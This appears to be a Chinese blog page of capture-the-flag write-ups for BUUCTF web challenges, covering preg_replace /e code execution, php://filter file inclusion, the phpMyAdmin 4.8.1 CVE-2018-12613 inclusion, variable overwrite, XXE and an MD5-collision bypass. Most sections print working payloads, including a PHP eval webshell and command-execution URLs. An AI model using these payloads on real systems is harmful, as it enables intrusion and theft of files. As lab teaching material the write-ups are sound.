<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>这里<code>preg_replace</code>函数中, 使用了<code>/e</code>标签,意思是将完成替换后的字符串当作php代码来执行</strong></p>
<p><code>strtolower(&quot;\\1&quot;)</code>得到得结果也就是<code>\\1</code>, 其中第一个反斜杠将第二个反斜杠转义,所以最后也就是<code>\1</code>, 这里<code>\1</code>具有特殊含义,<strong>也就是指定第一个匹配项:</strong></p>
<blockquote>
<p>反向引用 对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中， 所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。 缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 <code>\n</code> 访问， 其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
</blockquote>
<p>在<code>foreach</code>中,<code>$_GET</code>是一个数组, <code>$re</code>和<code>$str</code>分别是数组中的键和值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$row</span>=<span class="keyword">array</span>(<span class="string">&#x27;one&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;two&#x27;</span>=&gt;<span class="number">2</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27;--&#x27;</span>.<span class="variable">$val</span>;</span><br><span class="line"><span class="comment">#one--1</span></span><br><span class="line"><span class="comment">#two--2</span></span><br></pre></td></tr></table></figure>

<p>所以综合起来看,我们如果在GET中传一个变量</p>
<p><strong>这个变量传到<code>complex</code>函数的<code>preg_replace</code>的变量名将作为匹配模式,也就是第一个参数, 变量值将作为匹配字符串,也就是第三个参数, 第一个匹配结果将被作为代码来执行</strong></p>
<p>那么这里就需要给<code>$str</code>传一个能够被执行的函数, 并且给<code>$re</code>传一个能够把整个函数名匹配到的正则表达式</p>
<p>那么传一下试试: 这里<code>\S</code>表示匹配任意非空白字符, <code>*</code>表示零至多次. 这里<code>phpinfo</code>外面加上括号和<code>$</code>是为了把<code>phpinfo()</code>本身当作变量来执行,否则只会把<code>phpinfo()</code>当作普通的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://976dd10f-e322-4cea-860d-3de8db5d7f26.node4.buuoj.cn:81/next.php?(\S*)=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221019232635204-1667047819735106.png" alt="image-20221019232635204" style="zoom:67%;" />

<p>直接写<code>phpinfo()</code>时: 这里 <code>preg_replace</code>仅仅按照<code>\1</code>的要求返回了第一项的匹配结果, 并通过<code>foreach</code>中的echo</p>
<img src="/images/buuctf-web/image-20221019232607351-1667047819735107.png" alt="image-20221019232607351" style="zoom:67%;" />



<p>那么接下来就可以执行命令获取<code>flag</code>了, 可以借助代码中给的<code>getFlag</code>函数 (这里最后面输出的命令是<code>foreach</code>那里输出的)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://976dd10f-e322-4cea-860d-3de8db5d7f26.node4.buuoj.cn:81/next.php?(\S*)=$&#123;getFlag()&#125;&amp;cmd=system(&quot;ls /&quot;);</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221019233132811.png" alt="image-20221019233132811" style="zoom:67%;" />



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://976dd10f-e322-4cea-860d-3de8db5d7f26.node4.buuoj.cn:81/next.php?(\S*)=$&#123;getFlag()&#125;&amp;cmd=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221019233442119.png" alt="image-20221019233442119" style="zoom:67%;" />

<br>

<hr>
<br>

<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><img src="/images/buuctf-web/image-20221019235152219-1667047819735108.png" alt="image-20221019235152219" style="zoom:50%;" />



<p>这里分别点击两个连接,会通过GET来传参</p>
<img src="/images/buuctf-web/image-20221019235244100-1667047819735109.png" alt="image-20221019235244100" style="zoom:67%;" />

<p>尝试修改一下参数的值:</p>
<img src="/images/buuctf-web/image-20221019235321272-1667047819735110.png" alt="image-20221019235321272" style="zoom: 67%;" />



<p>当参数值中仍然包含<code>woofers</code>或者<code>meowers</code>但是后面加上其他字符时: 出现了报错:</p>
<img src="/images/buuctf-web/image-20221019235442137-1667047819735111.png" alt="image-20221019235442137" style="zoom: 80%;" />



<p>那么可以发现这里的逻辑实际上是先使用<code>strpos</code>函数来检测传的参数值中是否包括了<code>woofers</code>或者<code>meowers</code>,如果不包括则返回上上个页面,如果包括了,则在参数值后面加上<code>.php</code>然后去<code>include</code>包含这个<code>xxx.php</code>的文件. 这里由于传的是<code>wooferssss</code>,而包含的时候又找不到<code>wooferssss.php</code>自然就报错了</p>
<p>那么知道了是文件包含,使用伪协议就好了,先输出一下<code>index.php</code>的源码: 注意这里会在结尾自动加<code>.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://277e962e-4d21-4394-b91b-5aca2d6aba9e.node4.buuoj.cn:81/index.php?category=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure>

<p>将输出的<code>base64</code>编码解码后得到: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">		<span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">			<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>要想实现包含, 参数里必须包含<code>woofers</code>或者<code>meowers</code>或者<code>index</code></p>
<p><strong>这里有个小技巧,<code>php</code>伪协议中,在任意位置套一层其他协议,虽然可能会产生报错,但是不影响输出,(无法找到对应的过滤器时就会跳过它)例如:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?category=php://filter/meowers/read=convert.base64-encode/resource=flag</span><br><span class="line">?category=php://filter/read=convert.base64-encode/meowers/resource=flag</span><br><span class="line">//这里并不存在的&#x27;meowers&#x27;可以放在任意位置</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221020001536369.png" alt="image-20221020001536369" style="zoom:80%;" />

<p>解码出来就得到flag了.</p>
<br>

<hr>
<br>

<h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>发现存在<code>robots.txt</code>,不过看了下<code>phpinfo.php</code>,也没啥提示</p>
<img src="/images/buuctf-web/image-20221020090457446.png" alt="image-20221020090457446" style="zoom:67%;" />

<p><code>dirsearch</code>扫到了<code>phpmyadmin</code>目录:</p>
<img src="/images/buuctf-web/image-20221020091257148.png" alt="image-20221020091257148" style="zoom:67%;" />

<p>这里发现<code>phpmyadmin</code>的版本只有4.8.1</p>
<img src="/images/buuctf-web/image-20221020092057719.png" alt="image-20221020092057719" style="zoom:80%;" />

<p>这里总结了<code>phpmyadmin</code>各个版本的漏洞:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label2_0">https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label2_0</a></p>
<p>其中4.8.1可利用的有<code>CVE-2018-12613：后台文件包含</code></p>
<p>SQL执行,将PHP代码写入<code>Session</code>文件中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_GET[&#x27;a&#x27;]);?&gt;&quot;</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221020094425642.png" alt="image-20221020094425642" style="zoom:80%;" />

<p>接下来包含这个<code>Session</code>文件: 这里的<code>835v7i8inaavcmf1so2dg88flm</code>是<code>phpmyadmin</code>的<code>cookie</code>值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2c86d745-3121-4e69-aad4-eb54c6866105.node4.buuoj.cn:81/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_835v7i8inaavcmf1so2dg88flm&amp;a=system(&quot;ls /&quot;);</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221020094618243-1667047819735112.png" alt="image-20221020094618243" style="zoom:67%;" />

<p>然后就可以上传的一句话木马执行任意命令了:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://2c86d745-3121-4e69-aad4-eb54c6866105.node4.buuoj.cn:81/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_835v7i8inaavcmf1so2dg88flm&amp;a=system(&quot;ls /&quot;);</span><br><span class="line">http://2c86d745-3121-4e69-aad4-eb54c6866105.node4.buuoj.cn:81/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_835v7i8inaavcmf1so2dg88flm&amp;a=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221020094219846-1667047819735113.png" alt="image-20221020094219846" style="zoom:67%;" />

<img src="/images/buuctf-web/image-20221020094320734-1667047819735114.png" alt="image-20221020094320734" style="zoom:67%;" />



<br>

<hr>
<br>

<h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><img src="/images/buuctf-web/image-20221020102354830-1667047819735115.png" alt="image-20221020102354830" style="zoom: 50%;" />

<img src="/images/buuctf-web/image-20221020102429804-1667047819735116.png" alt="image-20221020102429804" style="zoom:67%;" />

<p><code>dirsearch</code>扫描,发现<code>.git</code>泄露:</p>
<img src="/images/buuctf-web/image-20221020102729256.png" alt="image-20221020102729256" style="zoom:67%;" />

<p>使用<code>githack</code>工具进行利用:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GitHack.py http://34ffe92e-2746-4479-92f2-ca5c64d7195e.node4.buuoj.cn:81/.git/</span><br></pre></td></tr></table></figure>

<p>能够扫到<code>flag.php</code>和<code>index.php</code>,但是有概率扒不下来,执行一下<code>git init</code>,再多尝试几次就好了:</p>
<img src="/images/buuctf-web/image-20221020104605588.png" alt="image-20221020104605588" style="zoom:80%;" />

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.php:</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<p>这里是变量覆盖: 思路就是直接<strong>用get传参数把$flag的值放到其他变量中，输出对应的变量</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">如果选择在第23行的exit处输出flag: </span><br><span class="line">需要把$yds覆盖成$flag, 且GET和POST中都不传flag</span><br><span class="line">http://34ffe92e-2746-4479-92f2-ca5c64d7195e.node4.buuoj.cn:81/index.php?yds=flag</span><br><span class="line">这样不传POST就行了</span><br><span class="line"></span><br><span class="line">如果选择在第26行的exit处输出flag:</span><br><span class="line">需要将$is覆盖成$flag, 且有$_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;或者$_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;</span><br><span class="line">这里如果传$_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;会导致flag变量被覆盖,所以依然在get中传这个参数:</span><br><span class="line">http://34ffe92e-2746-4479-92f2-ca5c64d7195e.node4.buuoj.cn:81/index.php?is=flag&amp;flag=flag</span><br><span class="line"></span><br><span class="line">如果在最后输出flag,想了半天没想出来..</span><br></pre></td></tr></table></figure>



<br>

<hr>
<br>



<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><img src="/images/buuctf-web/image-20221020114653824-1667047819735117.png" alt="image-20221020114653824" style="zoom:67%;" />

<p>看源码,用户提交的数据被拼接成了<code>XML</code>数据,这里可能会考<code>xxe</code></p>
<p>抓包发现<code>username</code>中的内容能够回显</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE root[                                                 </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;asdf&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p>这里自定义变量<code>&amp;xxe</code>的值就是<code>SYSTEM &quot;file:///flag&quot;</code> </p>
<p>通过响应页面对<code>username</code>标签的回显,将这段代码的执行结果,也就是读取<code>/flag</code>的内容输出</p>
<img src="/images/buuctf-web/image-20221020120500948-1667047819735118.png" alt="image-20221020120500948" style="zoom:67%;" />

<br>

<hr>
<br>

<h1 id="md5强比较绕过-easy-web"><a href="#md5强比较绕过-easy-web" class="headerlink" title="[md5强比较绕过]easy_web"></a>[md5强比较绕过]easy_web</h1><p>进来看到<code>url</code>中有两个参数:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</span><br></pre></td></tr></table></figure>

<p>源码里有提示: <code>md5</code>相关</p>
<p><img src="/images/buuctf-web/image-20221020145903227.png" alt="image-20221020145903227" style="zoom:67%;" />..</p>
<img src="/images/buuctf-web/image-20221020153441156-1667047819735119.png" alt="image-20221020153441156" style="zoom: 80%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php:</span><br><span class="line">7068703a2f2f66696c7465722f726561643d636f6e766572742e6261736536342d656e636f64652f7265736f757263653d696e6465782e706870</span><br><span class="line">index.php:</span><br><span class="line">696e6465782e706870</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221020154152153-1667047819735120.png" alt="image-20221020154152153" style="zoom:67%;" />

<p>解密得到<code>index.php</code>的源码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]))); <span class="comment">//对file进行两次base64解码,然后从16进制转为2进制</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123; <span class="comment">//file中不能包含&quot;flag&quot;</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));  <span class="comment">//读取的file内容进行base64编码</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="comment">// cmd中的过滤字符</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>27行中,php中<strong>用反引号包裹的变量</strong>, <strong>会将变量值当作<code>shell</code>命令来执行</strong>,并返回执行结果</p>
<p>所以这里就是让<code>cmd</code>避开过滤字符执行系统命令</p>
<p>同时还要POST两个变量a和b,它们转字符串之后的值不相等,但md5值相等</p>
<p>这里由于使用了<code>===</code>强相等, 所以之前使用的数组绕过,<code>0e</code>绕过等就无法使用了</p>
<p>这里利用md5碰撞工具<code>fastcoll</code>,产生两个md5值相同的2进制文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">E:\CTF工具合集\md5碰撞\fastcoll_v1.0.0.5.exe&gt;fastcoll_v1.0.0.5.exe -o a b</span><br><span class="line">MD5 collision generator v1.5</span><br><span class="line">by Marc Stevens (http://www.win.tue.nl/hashclash/)</span><br><span class="line"></span><br><span class="line">Using output filenames: &#x27;a&#x27; and &#x27;b&#x27;</span><br><span class="line">Using initial value: 0123456789abcdeffedcba9876543210</span><br><span class="line"></span><br><span class="line">Generating first block: .</span><br><span class="line">Generating second block: S11.</span><br><span class="line">Running time: 0.153 s</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221020163346764-1667047819735121.png" alt="image-20221020163346764" style="zoom:67%;" />

<p>在<code>burpsuite</code>的<code>repeater</code>中右键:<code>paste from file</code>,加载文件后选中右键-<code>send to decoder</code>(注意,直接复制到<code>decoder</code>中的话不是对二进制进行编码,结果会不一样), 然后进行URL编码:</p>
<img src="/images/buuctf-web/image-20221020163559394-1667047819735122.png" alt="image-20221020163559394" style="zoom:67%;" />

<p>将编码后的内容分别复制给a和b</p>
